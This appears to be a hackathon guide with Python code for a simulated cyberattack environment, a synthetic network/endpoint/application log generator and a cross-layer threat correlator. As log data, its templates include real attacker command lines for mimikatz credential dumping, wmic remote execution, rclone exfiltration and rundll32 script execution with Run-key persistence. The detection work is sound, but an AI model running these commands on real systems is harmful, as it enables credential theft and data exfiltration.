# BACKEND ATTACK GENERATION — FULL DIAGNOSTIC & FIX PROMPT
## CyberGuardian AI | Hack Malenadu '26
## Read this top to bottom before touching any file

---

## WHAT THIS PROMPT FIXES

The attack generation pipeline has 5 places where things commonly break.
Work through each section in order. Each section has:
  → What it should do (from the PS)
  → The most common way it breaks
  → The exact fix

---

## THE GROUND TRUTH — WHAT THE PS DEMANDS

Before fixing anything, burn these requirements into your head:

```
PS REQUIREMENT 1: Ingest from AT LEAST 2 of 3 layers
  → Network:   src/dst IP, port, protocol, bytes, duration, flags
  → Endpoint:  process name, parent PID, user, file access, registry
  → App:       method, endpoint, status code, payload size, UA, geolocation

PS REQUIREMENT 2: Detect EXACTLY these 4 threat types
  → Brute Force:       repeated failed auth from single/distributed source
  → Lateral Movement:  unusual internal traffic after initial compromise
  → Data Exfiltration: abnormally large/frequent outbound transfers
  → C2 Beaconing:      periodic, LOW-VOLUME connections at REGULAR intervals

PS REQUIREMENT 3: Each detection must have
  → Confidence score (0.0 – 1.0)
  → Severity level (Low / Medium / High / Critical)

PS REQUIREMENT 4: Cross-layer correlation
  → Single layer alert = LOW confidence noise
  → Same behavior on 2+ layers = HIGH confidence incident

PS REQUIREMENT 5: Demo data MUST include
  → At least 2 attack scenarios running SIMULTANEOUSLY
  → A false positive: admin bulk file transfer that looks like exfiltration

PS REQUIREMENT 6: Synthetic data must have BOTH benign and malicious traffic
  → Your model must be able to tell the difference
```

---

## SECTION 1: THE RED AGENT ACTION → LOG PIPELINE

### What It Should Do
Every time the Red Agent takes an action in `cyber_env.py`, that action
must generate at least ONE log per layer the action touches. The logs must
be realistic enough for the correlator to classify them correctly.

### The Most Common Break Points
```
BREAK 1: _execute_red_action() returns logs but they have wrong/missing fields
BREAK 2: log_generator methods are called but return empty dicts or None
BREAK 3: Action types in log_generator don't match action IDs in cyber_env.py
BREAK 4: Logs are generated but never passed to the correlator
BREAK 5: All 3 layers generate logs but they have no shared correlation_id
          so the correlator can't connect them
```

### The Fix — Full Working Implementation

```python
# FILE: src/simulation/log_generator.py
# REPLACE your entire log_generator.py with this

import uuid
import random
import time
from typing import List, Dict, Optional

class LogGenerator:
    """
    Generates synthetic logs for all three PS-required signal layers.
    
    CRITICAL RULE: Every attack action MUST call generate_all_layers()
    not individual layer methods. This ensures the correlation_id
    is shared across all three logs so the correlator can link them.
    """

    # ── HOST METADATA ────────────────────────────────────────────────────────

    HOST_IPS = {
        **{i: f"10.0.0.{i+1}"   for i in range(0, 2)},    # DMZ
        **{i: f"10.0.1.{i-1}"   for i in range(2, 7)},    # App servers
        **{i: f"10.0.7.{i-6}"   for i in range(7, 10)},   # DB servers
        **{i: f"10.0.10.{i-9}"  for i in range(10, 20)},  # Workstations
    }

    HOST_LABELS = {
        **{i: f"DMZ-{i+1:02d}"     for i in range(0, 2)},
        **{i: f"APP-{i-1:02d}"     for i in range(2, 7)},
        **{i: f"DB-{i-6:02d}"      for i in range(7, 10)},
        **{i: f"WS-{i-9:02d}"      for i in range(10, 20)},
    }

    HOST_TYPES = {
        **{i: "dmz"         for i in range(0, 2)},
        **{i: "app_server"  for i in range(2, 7)},
        **{i: "db_server"   for i in range(7, 10)},
        **{i: "workstation" for i in range(10, 20)},
    }

    EXTERNAL_IPS = [
        "185.220.101.45",   # Known Tor exit node range
        "45.142.212.100",   # Known C2 range
        "91.108.4.200",     # Eastern Europe range
        "103.75.190.50",    # Asia-Pacific range
    ]

    # ── ACTION → LAYER MAPPING ───────────────────────────────────────────────
    # Defines which layers each Red Agent action touches
    # PS requires at least 2 layers per attack chain

    ACTION_LAYERS = {
        "scan":         ["network"],                          # Recon: network only
        "exploit":      ["network", "endpoint"],              # Brute force: both layers
        "lateral_move": ["network", "endpoint", "application"], # Lateral: all 3
        "exfiltrate":   ["network", "endpoint", "application"], # Exfil: all 3
        "beacon":       ["network", "application"],           # C2: network + app
    }

    # ── MAIN ENTRY POINT ─────────────────────────────────────────────────────

    def generate_all_layers(
        self,
        action_type: str,
        source_host: int,
        target_host: int,
        step: int,
        success: bool = True,
        metadata: Optional[Dict] = None,
    ) -> List[Dict]:
        """
        THE ONLY METHOD _execute_red_action() SHOULD CALL.
        
        Generates logs for all applicable layers and stamps them with
        a shared correlation_id so the correlator can link them.
        
        Returns: list of log dicts (1 per layer)
        """
        correlation_id = f"ATK-{uuid.uuid4().hex[:12].upper()}"
        layers = self.ACTION_LAYERS.get(action_type, ["network"])
        logs = []

        for layer in layers:
            if layer == "network":
                log = self._network_log(action_type, source_host, target_host, step, success)
            elif layer == "endpoint":
                log = self._endpoint_log(action_type, target_host, step, success)
            elif layer == "application":
                log = self._application_log(action_type, source_host, target_host, step, success)
            else:
                continue

            # Stamp every log with shared metadata
            log["correlation_id"] = correlation_id
            log["step"] = step
            log["action_type"] = action_type
            log["success"] = success
            log["source_host_id"] = source_host
            log["target_host_id"] = target_host
            log["source_label"] = self.HOST_LABELS.get(source_host, f"HOST-{source_host:02d}")
            log["target_label"] = self.HOST_LABELS.get(target_host, f"HOST-{target_host:02d}")
            log["log_color"] = self._severity_color(action_type, success)
            log["is_malicious"] = True
            log["is_false_positive_seed"] = False

            logs.append(log)

        return logs

    # ── NETWORK LAYER ─────────────────────────────────────────────────────────

    def _network_log(
        self, action_type: str, src: int, dst: int, step: int, success: bool
    ) -> Dict:
        """
        Simulates firewall/NetFlow log.
        PS requires: src/dst IP, port, protocol, bytes, duration, flags
        """

        # Action → realistic port mapping
        PORT_MAP = {
            "scan":         {"src_port": random.randint(40000, 65000), "dst_port": random.choice([22, 80, 443, 3389, 8080, 21])},
            "exploit":      {"src_port": random.randint(40000, 65000), "dst_port": random.choice([22, 3389, 445, 1433, 5432])},
            "lateral_move": {"src_port": random.randint(40000, 65000), "dst_port": random.choice([135, 445, 5985, 5986])},  # WMI/WinRM
            "exfiltrate":   {"src_port": random.randint(40000, 65000), "dst_port": 443},
            "beacon":       {"src_port": random.randint(40000, 65000), "dst_port": random.choice([80, 443, 8080])},
        }

        # Action → realistic bytes transferred
        BYTES_MAP = {
            "scan":         random.randint(64, 512),
            "exploit":      random.randint(1024, 8192) if not success else random.randint(8192, 65536),
            "lateral_move": random.randint(50000, 500000),
            "exfiltrate":   random.randint(50_000_000, 500_000_000),  # 50–500 MB
            "beacon":       random.randint(128, 1024),   # KEY: beacons are LOW volume
        }

        # Action → TCP flags
        FLAGS_MAP = {
            "scan":         "SYN",
            "exploit":      "SYN,ACK,PSH" if success else "SYN,RST",
            "lateral_move": "PSH,ACK",
            "exfiltrate":   "PSH,ACK,FIN",
            "beacon":       "PSH,ACK",
        }

        ports = PORT_MAP.get(action_type, PORT_MAP["scan"])
        dst_ip = self.HOST_IPS.get(dst, "10.0.0.99")

        # Exfiltration and beacons go to EXTERNAL IPs
        if action_type in ["exfiltrate", "beacon"]:
            dst_ip = random.choice(self.EXTERNAL_IPS)

        return {
            "layer": "network",
            "src_ip": self.HOST_IPS.get(src, "10.0.0.1"),
            "dst_ip": dst_ip,
            "src_port": ports["src_port"],
            "dst_port": ports["dst_port"],
            "protocol": "TCP",
            "bytes_sent": BYTES_MAP.get(action_type, 1024),
            "bytes_received": random.randint(64, 512),
            "duration_ms": random.randint(50, 5000),
            "flags": FLAGS_MAP.get(action_type, "PSH,ACK"),
            "geo_country": "RU" if action_type in ["exfiltrate", "beacon"] else "LOCAL",
        }

    # ── ENDPOINT LAYER ────────────────────────────────────────────────────────

    def _endpoint_log(
        self, action_type: str, host: int, step: int, success: bool
    ) -> Dict:
        """
        Simulates EDR/Sysmon log.
        PS requires: process name, parent PID, user, file access, registry changes
        """

        PROCESS_MAP = {
            "exploit": {
                "process_name":   random.choice(["mimikatz.exe", "psexec.exe", "net.exe"]),
                "parent_process": "cmd.exe",
                "user":           "NT AUTHORITY\\SYSTEM" if success else "DOMAIN\\user",
                "command_line":   'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                "file_access":    ["C:\\Windows\\System32\\lsass.exe"],
                "registry_changes": ["HKLM\\SYSTEM\\CurrentControlSet\\Services\\"],
            },
            "lateral_move": {
                "process_name":   random.choice(["wmic.exe", "powershell.exe", "psexec.exe"]),
                "parent_process": "explorer.exe",
                "user":           "DOMAIN\\admin",
                "command_line":   f'wmic /node:"{self.HOST_IPS.get(host, "10.0.0.1")}" process call create "cmd.exe"',
                "file_access":    ["C:\\Windows\\System32\\wbem\\wmic.exe"],
                "registry_changes": [],
            },
            "exfiltrate": {
                "process_name":   random.choice(["robocopy.exe", "rclone.exe", "curl.exe"]),
                "parent_process": "cmd.exe",
                "user":           "DOMAIN\\admin",
                "command_line":   "rclone copy D:\\SensitiveData remote:exfil-bucket --transfers 10",
                "file_access":    ["D:\\SensitiveData\\", "D:\\Finance\\", "D:\\HR\\"],
                "registry_changes": [],
            },
            "beacon": {
                "process_name":   random.choice(["svchost.exe", "rundll32.exe", "regsvr32.exe"]),
                "parent_process": "services.exe",
                "user":           "NT AUTHORITY\\NETWORK SERVICE",
                "command_line":   'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
                "file_access":    [],
                "registry_changes": [
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
                ],
            },
        }

        proc_data = PROCESS_MAP.get(action_type, {
            "process_name": "cmd.exe",
            "parent_process": "explorer.exe",
            "user": "DOMAIN\\user",
            "command_line": "cmd.exe /c whoami",
            "file_access": [],
            "registry_changes": [],
        })

        return {
            "layer": "endpoint",
            "host_id": host,
            "host_label": self.HOST_LABELS.get(host, f"HOST-{host:02d}"),
            "host_type": self.HOST_TYPES.get(host, "workstation"),
            "process_name": proc_data["process_name"],
            "process_pid": random.randint(1000, 9999),
            "parent_process": proc_data["parent_process"],
            "parent_pid": random.randint(100, 999),
            "user": proc_data["user"],
            "command_line": proc_data["command_line"],
            "file_access": proc_data["file_access"],
            "registry_changes": proc_data["registry_changes"],
            "integrity_level": "High" if success else "Medium",
        }

    # ── APPLICATION LAYER ─────────────────────────────────────────────────────

    def _application_log(
        self, action_type: str, src: int, dst: int, step: int, success: bool
    ) -> Dict:
        """
        Simulates web server / API gateway log.
        PS requires: method, endpoint, status code, payload size, UA, geolocation
        """

        APP_MAP = {
            "exploit": {
                "method": "POST",
                "endpoint": random.choice(["/login", "/admin/login", "/wp-login.php", "/auth/token"]),
                "status_code": 200 if success else random.choice([401, 403, 429]),
                "payload_size_bytes": random.randint(256, 1024),
                "user_agent": random.choice([
                    "python-requests/2.28.0",
                    "Hydra v9.4",
                    "sqlmap/1.7",
                    "curl/7.85.0",
                ]),
                "response_time_ms": random.randint(20, 200),
            },
            "lateral_move": {
                "method": "GET",
                "endpoint": random.choice(["/api/internal/admin", "/api/v1/users", "/internal/config"]),
                "status_code": 200 if success else 403,
                "payload_size_bytes": random.randint(512, 4096),
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "response_time_ms": random.randint(50, 500),
            },
            "exfiltrate": {
                "method": "POST",
                "endpoint": random.choice(["/upload", "/api/sync", "/backup/push"]),
                "status_code": 200,
                "payload_size_bytes": random.randint(50_000_000, 200_000_000),
                "user_agent": "rclone/v1.60.1",
                "response_time_ms": random.randint(5000, 30000),
            },
            "beacon": {
                "method": "GET",
                "endpoint": random.choice(["/update", "/check", "/ping", "/api/version"]),
                "status_code": 200,
                "payload_size_bytes": random.randint(64, 256),  # KEY: tiny payload
                "user_agent": "Windows-Update-Agent/10.0.0.1",
                "response_time_ms": random.randint(100, 500),
            },
        }

        app_data = APP_MAP.get(action_type, {
            "method": "GET",
            "endpoint": "/",
            "status_code": 200,
            "payload_size_bytes": 512,
            "user_agent": "Mozilla/5.0",
            "response_time_ms": 100,
        })

        return {
            "layer": "application",
            "src_ip": self.HOST_IPS.get(src, "10.0.0.1"),
            "src_label": self.HOST_LABELS.get(src, f"HOST-{src:02d}"),
            "method": app_data["method"],
            "endpoint": app_data["endpoint"],
            "status_code": app_data["status_code"],
            "payload_size_bytes": app_data["payload_size_bytes"],
            "user_agent": app_data["user_agent"],
            "response_time_ms": app_data["response_time_ms"],
            "geolocation": {
                "country": "RU" if action_type in ["exfiltrate", "beacon"] else "IN",
                "city": "Moscow" if action_type in ["exfiltrate", "beacon"] else "Bengaluru",
                "is_vpn": action_type in ["exploit", "exfiltrate"],
            },
            "request_id": uuid.uuid4().hex[:16],
        }

    # ── FALSE POSITIVE SCENARIO ───────────────────────────────────────────────

    def generate_false_positive_scenario(self, step: int) -> List[Dict]:
        """
        PS REQUIREMENT: A realistic false positive — legitimate admin bulk
        file transfer that superficially resembles exfiltration.
        
        Network layer: LOOKS exactly like exfiltration (large bytes, external-ish IP)
        Endpoint layer: RESOLVES it — shows scheduled task + known service account
        App layer: RESOLVES it — shows backup tool user agent + known endpoint
        
        The correlator must use all 3 layers together to downgrade this from
        CRITICAL to FALSE_POSITIVE.
        """
        correlation_id = f"FP-{uuid.uuid4().hex[:12].upper()}"
        logs = []

        # Network layer: looks EXACTLY like exfiltration
        logs.append({
            "layer": "network",
            "correlation_id": correlation_id,
            "step": step,
            "action_type": "exfiltrate",   # This will trigger initial alert
            "src_ip": self.HOST_IPS.get(7, "10.0.7.1"),   # DB server
            "dst_ip": "10.100.0.5",        # Internal backup server (unusual subnet)
            "src_port": random.randint(40000, 65000),
            "dst_port": 443,
            "protocol": "TCP",
            "bytes_sent": 250_000_000,     # 250MB — triggers exfil threshold
            "duration_ms": 45000,
            "flags": "PSH,ACK,FIN",
            "geo_country": "LOCAL",
            "source_host_id": 7,
            "target_host_id": -1,          # External-ish
            "source_label": "DB-01",
            "is_malicious": False,         # GROUND TRUTH: not malicious
            "is_false_positive_seed": True,
            "log_color": "#ffcc00",
            "success": True,
        })

        # Endpoint layer: RESOLVES the false positive
        logs.append({
            "layer": "endpoint",
            "correlation_id": correlation_id,
            "step": step,
            "action_type": "exfiltrate",
            "host_id": 7,
            "host_label": "DB-01",
            "process_name": "robocopy.exe",
            "process_pid": 4821,
            "parent_process": "taskschd.exe",      # KEY: Task Scheduler parent!
            "parent_pid": 948,
            "user": "DOMAIN\\svc_backup",          # KEY: known service account!
            "command_line": "robocopy D:\\Data \\\\backup-srv\\nightly /MIR /LOG:C:\\backup.log",
            "file_access": ["D:\\Data\\"],
            "registry_changes": [],
            "integrity_level": "Medium",
            "scheduled_task_name": "NightlyBackup_02:00",  # KEY: resolves FP
            "source_host_id": 7,
            "is_malicious": False,
            "is_false_positive_seed": True,
            "fp_resolution_reason": "Legitimate scheduled backup — taskschd.exe parent + svc_backup account",
            "log_color": "#ffcc00",
            "success": True,
        })

        # Application layer: RESOLVES the false positive
        logs.append({
            "layer": "application",
            "correlation_id": correlation_id,
            "step": step,
            "action_type": "exfiltrate",
            "src_ip": self.HOST_IPS.get(7, "10.0.7.1"),
            "src_label": "DB-01",
            "method": "PUT",
            "endpoint": "/backup/nightly",        # KEY: known backup endpoint
            "status_code": 200,
            "payload_size_bytes": 250_000_000,
            "user_agent": "robocopy/6.3.9600",   # KEY: robocopy UA
            "response_time_ms": 45000,
            "geolocation": {"country": "IN", "city": "Bengaluru", "is_vpn": False},
            "request_id": uuid.uuid4().hex[:16],
            "source_host_id": 7,
            "is_malicious": False,
            "is_false_positive_seed": True,
            "fp_resolution_reason": "Backup endpoint + robocopy user agent",
            "log_color": "#ffcc00",
            "success": True,
        })

        return logs

    # ── BENIGN TRAFFIC GENERATOR ──────────────────────────────────────────────

    def generate_benign_traffic(self, step: int, num_events: int = 10) -> List[Dict]:
        """
        PS REQUIREMENT: Synthetic data must include BENIGN traffic.
        Generates realistic normal traffic so the detector learns the difference.
        """
        logs = []
        for _ in range(num_events):
            src = random.randint(10, 19)   # Workstations generate most traffic
            dst = random.randint(2, 6)     # To app servers
            correlation_id = f"BENIGN-{uuid.uuid4().hex[:8].upper()}"

            # Normal web browsing / work traffic
            logs.append({
                "layer": "network",
                "correlation_id": correlation_id,
                "step": step,
                "action_type": "normal_traffic",
                "src_ip": self.HOST_IPS.get(src, "10.0.10.1"),
                "dst_ip": self.HOST_IPS.get(dst, "10.0.1.1"),
                "src_port": random.randint(40000, 65000),
                "dst_port": random.choice([80, 443, 8080]),
                "protocol": "TCP",
                "bytes_sent": random.randint(512, 50000),
                "duration_ms": random.randint(100, 2000),
                "flags": "PSH,ACK",
                "geo_country": "LOCAL",
                "source_host_id": src,
                "target_host_id": dst,
                "source_label": self.HOST_LABELS.get(src, f"WS-{src-9:02d}"),
                "is_malicious": False,
                "is_false_positive_seed": False,
                "log_color": "#00e5ff",
                "success": True,
            })

        return logs

    # ── HELPERS ───────────────────────────────────────────────────────────────

    def _severity_color(self, action_type: str, success: bool) -> str:
        if not success: return "#3d5570"
        return {
            "scan":         "#00ccff",
            "exploit":      "#ff0044",
            "lateral_move": "#ff6600",
            "exfiltrate":   "#ff0000",
            "beacon":       "#ffcc00",
        }.get(action_type, "#ffffff")
```

---

## SECTION 2: THE RL ENVIRONMENT — RED AGENT ACTIONS

### What It Should Do
`_execute_red_action()` must call `log_generator.generate_all_layers()`
for every hostile action. The logs it returns must be added to `self.logs`.

### The Fix

```python
# FILE: src/environment/cyber_env.py
# REPLACE _execute_red_action() with this

def _execute_red_action(
    self,
    target: int,
    action_type: int
) -> Tuple[float, List[Dict]]:
    """
    Execute Red Agent action and return (reward, logs).
    
    Action IDs:
      0 = scan
      1 = exploit  (brute force)
      2 = lateral_move
      3 = exfiltrate
      4 = beacon    (C2)
      5 = wait
    """
    reward = 0.0
    logs = []

    # ── ACTION 0: SCAN (Reconnaissance) ────────────────────────────────────
    if action_type == 0:
        if self.network.can_reach(self.red_position, target):
            vulns = self.network.get_vulnerabilities(target)
            reward = 1.0
            logs = self.log_generator.generate_all_layers(
                action_type="scan",
                source_host=self.red_position,
                target_host=target,
                step=self.current_step,
                success=True,
            )

    # ── ACTION 1: EXPLOIT (Brute Force / Credential Stuffing) ──────────────
    elif action_type == 1:
        if target in self.patched_hosts:
            success_prob = 0.05   # Heavily patched — nearly impossible
        else:
            success_prob = self.network.get_exploit_success_rate(target)

        success = (np.random.random() < success_prob)

        if success:
            self.compromised_hosts.add(target)
            reward = 20.0
        else:
            reward = -2.0

        # ALWAYS generate logs — even failed exploits leave traces
        logs = self.log_generator.generate_all_layers(
            action_type="exploit",
            source_host=self.red_position,
            target_host=target,
            step=self.current_step,
            success=success,
        )

    # ── ACTION 2: LATERAL MOVEMENT ──────────────────────────────────────────
    elif action_type == 2:
        if target in self.compromised_hosts:
            neighbors = self.network.get_neighbors(target)
            moved = False
            for neighbor in neighbors:
                if neighbor not in self.compromised_hosts and neighbor not in self.isolated_hosts:
                    self.compromised_hosts.add(neighbor)
                    self.red_position = neighbor   # UPDATE RED'S POSITION
                    reward = 15.0
                    moved = True
                    logs = self.log_generator.generate_all_layers(
                        action_type="lateral_move",
                        source_host=target,
                        target_host=neighbor,
                        step=self.current_step,
                        success=True,
                    )
                    break
            if not moved:
                reward = -1.0  # Nowhere to move

    # ── ACTION 3: EXFILTRATE (Data Theft) ───────────────────────────────────
    elif action_type == 3:
        if target in self.compromised_hosts and target not in self.isolated_hosts:
            data_value = self.network.get_data_value(target)
            self.data_exfiltrated += data_value
            reward = data_value * 10.0
            logs = self.log_generator.generate_all_layers(
                action_type="exfiltrate",
                source_host=target,
                target_host=-1,   # -1 = external
                step=self.current_step,
                success=True,
            )
        else:
            reward = -5.0   # Can't exfil from a host you don't control

    # ── ACTION 4: BEACON (C2 Command and Control) ────────────────────────────
    elif action_type == 4:
        if target in self.compromised_hosts and target not in self.isolated_hosts:
            reward = 0.5
            logs = self.log_generator.generate_all_layers(
                action_type="beacon",
                source_host=target,
                target_host=-1,   # -1 = external C2 server
                step=self.current_step,
                success=True,
            )

    # ── ACTION 5: WAIT (Stealth) ─────────────────────────────────────────────
    elif action_type == 5:
        reward = 0.1
        # No logs — stealth means no activity

    # ── ADD TO EPISODE LOG HISTORY ───────────────────────────────────────────
    self.logs.extend(logs)

    return reward, logs


def _execute_blue_action(
    self,
    target: int,
    action_type: int
) -> Tuple[float, List[Dict]]:
    """
    Execute Blue Agent action.
    
    Action IDs:
      0 = monitor
      1 = isolate
      2 = patch
      3 = block_ip
      4 = reset_creds
      5 = investigate
    """
    reward = 0.0
    logs = []
    is_tp = target in self.compromised_hosts  # Is this a true positive action?

    if action_type == 0:   # Monitor
        reward = 0.0

    elif action_type == 1:  # Isolate
        self.isolated_hosts.add(target)
        if is_tp:
            self.detected_compromises.add(target)
            self.true_positives += 1
            reward = 50.0
            # Early detection bonus
            reward += max(0, 50 - self.current_step)
        else:
            self.false_positives += 1
            reward = -30.0   # False positive penalty

    elif action_type == 2:  # Patch
        self.patched_hosts.add(target)
        reward = 5.0

    elif action_type == 3:  # Block IP
        if is_tp:
            self.detected_compromises.add(target)
            self.true_positives += 1
            reward = 30.0
        else:
            self.false_positives += 1
            reward = -10.0

    elif action_type == 4:  # Reset credentials
        if is_tp:
            self.compromised_hosts.discard(target)
            self.detected_compromises.add(target)
            self.true_positives += 1
            reward = 40.0
        else:
            reward = -5.0

    elif action_type == 5:  # Investigate
        if is_tp:
            reward = 10.0
            # Investigating doesn't catch but gives Blue info
        else:
            reward = -2.0

    logs.append({
        "layer": "blue_action",
        "step": self.current_step,
        "action_type": ["monitor","isolate","patch","block_ip","reset_creds","investigate"][action_type],
        "target_host_id": target,
        "target_label": self.log_generator.HOST_LABELS.get(target, f"HOST-{target:02d}"),
        "is_true_positive": is_tp,
        "reward": reward,
        "is_malicious": False,
        "correlation_id": f"BLUE-{self.current_step:04d}-{target:02d}",
    })

    self.logs.extend(logs)
    return reward, logs
```

---

## SECTION 3: THE CORRELATOR — FIX THE CROSS-LAYER LOGIC

### The Most Common Break
The correlator is called but receives logs with no `correlation_id`,
or it receives them AFTER the step ends instead of DURING it.

### The Fix

```python
# FILE: src/detection/correlator.py
# REPLACE your entire correlator with this

from collections import defaultdict
from typing import List, Dict, Optional
import uuid

class CrossLayerCorrelator:
    """
    PS REQUIREMENT: Single-layer alert = noise.
    Same behavior on 2+ layers = high-confidence incident.
    
    How it works:
      1. Group all logs by correlation_id
      2. For each chain: count distinct layers
      3. Scale confidence + severity by layer count
      4. Resolve false positives using endpoint/app evidence
    """

    THREAT_TYPE_MAP = {
        "scan":         "brute_force",          # Recon feeds into brute force
        "exploit":      "brute_force",
        "lateral_move": "lateral_movement",
        "exfiltrate":   "data_exfiltration",
        "beacon":       "c2_beacon",
        "normal_traffic": None,                 # Not a threat
    }

    MITRE_MAP = {
        "brute_force":       ("T1110", "Brute Force"),
        "lateral_movement":  ("T1021", "Remote Services"),
        "data_exfiltration": ("T1041", "Exfiltration Over C2"),
        "c2_beacon":         ("T1071", "Application Layer Protocol"),
    }

    # Severity thresholds by layer count
    SEVERITY_BY_LAYERS = {1: "low", 2: "high", 3: "critical"}
    CONFIDENCE_BY_LAYERS = {1: 0.30, 2: 0.75, 3: 0.95}

    def __init__(self):
        self.log_buffer: List[Dict] = []
        self.window_size = 10   # steps to keep in rolling window

    def ingest(self, logs: List[Dict], current_step: int):
        """Add new logs to the rolling window buffer"""
        self.log_buffer.extend(logs)
        # Trim to window
        cutoff = current_step - self.window_size
        self.log_buffer = [
            l for l in self.log_buffer
            if l.get("step", 0) >= cutoff
        ]

    def correlate(self, current_step: int) -> List[Dict]:
        """
        Process current buffer and return list of ThreatAlert dicts.
        Call this ONCE per simulation step.
        """
        alerts = []

        # Group logs by correlation_id
        chains = defaultdict(list)
        for log in self.log_buffer:
            cid = log.get("correlation_id")
            if cid and not cid.startswith("BENIGN"):
                chains[cid].append(log)

        for cid, chain_logs in chains.items():
            # Skip pure blue-action chains
            malicious_logs = [l for l in chain_logs if l.get("is_malicious", True)
                              and l.get("layer") != "blue_action"]
            if not malicious_logs:
                continue

            # Count distinct layers
            layers = set(l["layer"] for l in malicious_logs
                        if l["layer"] in ["network", "endpoint", "application"])
            layer_count = max(1, len(layers))

            # Get the primary action type
            action_type = malicious_logs[0].get("action_type", "scan")
            threat_type = self.THREAT_TYPE_MAP.get(action_type)
            if threat_type is None:
                continue

            # Check for false positive resolution
            fp_indicators = self._check_false_positive(chain_logs)
            is_fp = len(fp_indicators) > 0

            # Downgrade if false positive
            if is_fp:
                confidence = 0.15
                severity = "low"
            else:
                confidence = self.CONFIDENCE_BY_LAYERS[min(layer_count, 3)]
                severity = self.SEVERITY_BY_LAYERS[min(layer_count, 3)]

            mitre_id, mitre_name = self.MITRE_MAP.get(threat_type, ("T0000", "Unknown"))

            affected_hosts = list(set(
                [l.get("source_host_id") for l in malicious_logs if l.get("source_host_id") is not None]
                + [l.get("target_host_id") for l in malicious_logs if l.get("target_host_id") is not None]
            ))
            affected_hosts = [h for h in affected_hosts if h >= 0]

            alert = {
                "id": f"ALERT-{cid}",
                "correlation_id": cid,
                "threat_type": threat_type,
                "severity": severity,
                "confidence": round(confidence, 2),
                "layers_flagged": layer_count,
                "layer_breakdown": {
                    "network":     "network" in layers,
                    "endpoint":    "endpoint" in layers,
                    "application": "application" in layers,
                },
                "affected_hosts": affected_hosts,
                "affected_host_labels": list(set(
                    l.get("source_label", "") for l in malicious_logs
                    if l.get("source_label")
                )),
                "mitre_id": mitre_id,
                "mitre_name": mitre_name,
                "headline": self._generate_headline(threat_type, malicious_logs),
                "detail": self._generate_detail(threat_type, layer_count, malicious_logs),
                "false_positive_indicators": fp_indicators,
                "is_likely_false_positive": is_fp,
                "step": current_step,
                "status": "active",
            }

            alerts.append(alert)

        return alerts

    def _check_false_positive(self, logs: List[Dict]) -> List[str]:
        """
        Return list of FP indicator strings if this chain is a false positive.
        Uses endpoint and application layer evidence to resolve.
        """
        indicators = []
        for log in logs:
            if log.get("is_false_positive_seed"):
                fp_reason = log.get("fp_resolution_reason", "")
                if fp_reason:
                    indicators.append(fp_reason)
                # Check for scheduled task evidence
                if log.get("scheduled_task_name"):
                    indicators.append(f"Scheduled task: {log['scheduled_task_name']}")
                if log.get("user", "").startswith("DOMAIN\\svc_"):
                    indicators.append(f"Known service account: {log['user']}")
                if log.get("parent_process") == "taskschd.exe":
                    indicators.append("Parent process: Task Scheduler")
                if "backup" in log.get("endpoint", "").lower():
                    indicators.append("Endpoint matches known backup URL")
                if "robocopy" in log.get("user_agent", "").lower():
                    indicators.append("User-Agent matches backup tool")
        return list(set(indicators))

    def _generate_headline(self, threat_type: str, logs: List[Dict]) -> str:
        label = logs[0].get("source_label", "Unknown host")
        headlines = {
            "brute_force":       f"Repeated login attempts detected from {label}",
            "lateral_movement":  f"Lateral movement from {label} across internal network",
            "data_exfiltration": f"Large outbound data transfer from {label} to external IP",
            "c2_beacon":         f"Periodic C2 beacon signal from {label} every few seconds",
        }
        return headlines.get(threat_type, f"Suspicious activity detected on {label}")

    def _generate_detail(self, threat_type: str, layer_count: int, logs: List[Dict]) -> str:
        """
        Plain-English explanation for SOC analyst.
        PS requires: plain-English reasoning + false positive indicator.
        """
        layer_phrase = (
            "one security camera"   if layer_count == 1 else
            "two security cameras"  if layer_count == 2 else
            "all three security cameras"
        )
        details = {
            "brute_force": (
                f"An attacker is trying many passwords on the same login page. "
                f"This was spotted by {layer_phrase} simultaneously. "
                f"{'High confidence — same pattern seen across network and process logs.' if layer_count >= 2 else 'Low confidence — only network traffic observed so far.'}"
            ),
            "lateral_movement": (
                f"After breaking into one computer, the attacker is quietly moving to nearby computers. "
                f"This was confirmed by {layer_phrase}. "
                f"{'Confirmed incident — process execution matches network movement.' if layer_count >= 2 else 'Possible lateral movement — awaiting endpoint confirmation.'}"
            ),
            "data_exfiltration": (
                f"A very large amount of data is leaving the network to an external IP. "
                f"{'This appears to be a legitimate backup — see false positive indicators above.' if any(l.get('is_false_positive_seed') for l in logs) else f'Spotted by {layer_phrase}. Treat as active theft until confirmed otherwise.'}"
            ),
            "c2_beacon": (
                f"A compromised computer is sending small, regular signals to an external server — "
                f"like a spy texting their boss every few seconds. "
                f"Spotted by {layer_phrase}. The regularity of the intervals is the giveaway."
            ),
        }
        return details.get(threat_type, "Anomalous behavior detected. Investigate immediately.")
```

---

## SECTION 4: WIRING EVERYTHING TOGETHER IN cyber_env.py

### The Fix — end of `step()` method

```python
# In CyberSecurityEnv.step() — replace the final block with this:

def step(self, action):
    self.current_step += 1

    red_target, red_type  = action["red_action"]
    blue_target, blue_type = action["blue_action"]

    # Execute actions
    red_reward, red_logs   = self._execute_red_action(red_target, red_type)
    blue_reward, blue_logs = self._execute_blue_action(blue_target, blue_type)

    # ── INJECT FALSE POSITIVE at step 15 (every episode) ─────────────────
    if self.current_step == 15:
        fp_logs = self.log_generator.generate_false_positive_scenario(self.current_step)
        self.logs.extend(fp_logs)
        red_logs.extend(fp_logs)   # Include in this step's log output

    # ── INJECT BENIGN TRAFFIC (every step) ───────────────────────────────
    benign = self.log_generator.generate_benign_traffic(self.current_step, num_events=5)
    self.logs.extend(benign)

    # ── RUN CORRELATOR ────────────────────────────────────────────────────
    all_step_logs = red_logs + blue_logs + benign
    self.correlator.ingest(all_step_logs, self.current_step)
    new_alerts = self.correlator.correlate(self.current_step)

    # ── UPDATE NETWORK STATE ──────────────────────────────────────────────
    self._update_network_state()

    # ── CHECK TERMINATION ─────────────────────────────────────────────────
    terminated = self._check_termination()
    truncated = self.current_step >= self.max_steps

    rewards = {"red": red_reward, "blue": blue_reward}
    observation = self._get_observation()

    info = {
        "compromised_hosts": list(self.compromised_hosts),
        "detected_compromises": list(self.detected_compromises),
        "isolated_hosts": list(self.isolated_hosts),
        "data_exfiltrated": self.data_exfiltrated,
        "true_positives": self.true_positives,
        "false_positives": self.false_positives,
        "red_caught": self.red_caught,
        "logs": all_step_logs,       # ALL logs from this step
